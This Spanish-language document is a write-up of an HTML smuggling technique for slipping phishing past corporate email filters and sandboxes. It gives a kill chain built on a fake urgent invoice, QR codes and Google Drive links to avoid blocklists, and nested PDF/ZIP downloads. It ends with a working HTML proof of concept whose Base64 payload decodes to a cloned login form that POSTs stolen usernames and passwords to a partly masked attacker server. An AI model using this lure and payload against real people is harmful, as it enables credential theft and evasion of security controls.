# Técnica de Evasión: HTML Smuggling & Sandbox Bypass

## 🕵️ Resumen de la Técnica
Esta técnica utiliza **HTML Smuggling** para evadir filtros de correo electrónico (SEG) y Sandboxes corporativos. En lugar de adjuntar un archivo malicioso que sería detectado por el antivirus perimetral, se envía un código HTML benigno que **"construye" el payload malicioso localmente** en el navegador de la víctima utilizando JavaScript y Base64.

---

## ⛓️ Kill Chain (Flujo de Ataque)

1.  **Vector de Entrega:** Correo legítimo (Gmail) con ingeniería social (Factura Urgente).
2.  **Evasión de URL:** Uso de **Códigos QR** y enlaces a **Google Drive** (dominio confiable) para evitar listas negras.
3.  **Descarga Anidada:** PDF en Drive -> ZIP en Drive -> Archivo `.html`.
4.  **Ejecución Local:** El archivo HTML se abre en el navegador. No hay tráfico de red sospechoso porque el archivo se genera en la memoria del cliente.
5.  **Exfiltración:** Formulario HTML puro que envía los datos (POST) a un VPS controlado (C2).

---

## 💻 Código de la Prueba de Concepto (PoC)

El siguiente código muestra cómo se utiliza JavaScript para decodificar un payload en Base64 y reescribir el documento (`document.write`) en tiempo real, engañando a los análisis estáticos.

```html
<!DOCTYPE html>
<html lang="es">
<head>
    <title>Factura Electrónica - Visualización Segura</title>
</head>
<body>
    <script>
        // ---------------------------------------------------------
        // TÉCNICA DE SMUGGLING:
        // El contenido malicioso (Formulario clonado) está cifrado en Base64.
        // Los filtros de seguridad solo ven una cadena de texto sin sentido.
        // ---------------------------------------------------------
        
        // Payload codificado (Simulación de Login Clonado)
        var payload_b64 = "PGZvcm0gYWN0aW9uPSJodHRwOi8vMTA4LjE0Mi5YWC5YWC9wb3N0LnBocCIgbWV0aG9kPSJQT1NUIj4KICA8aDE+U2VzaW9uIENhZHVjYWRhPC9oMT4KICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlciIgcGxhY2Vob2xkZXI9IlVzdWFyaW8iPgogIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icGFzcyIgcGxhY2Vob2xkZXI9IkNvbnRyYXNlw7FhIj4KICA8YnV0dG9uIHR5cGU9InN1Ym1pdCI+SW5ncmVzYXI8L2J1dHRvbj4KPC9mb3JtPg==";

        // Decodificación dinámica en el cliente (Client-Side Assembly)
        // atob() decodifica Base64 a String
        var contenido_real = atob(payload_b64);
        
        // Inyección en el DOM
        document.open();
        document.write(contenido_real);
        document.close();
        
        // NOTA: Al ejecutarse en local (file:// o blob:), 
        // muchas soluciones de seguridad no inspeccionan el tráfico generado.
    </script>
</body>
</html>
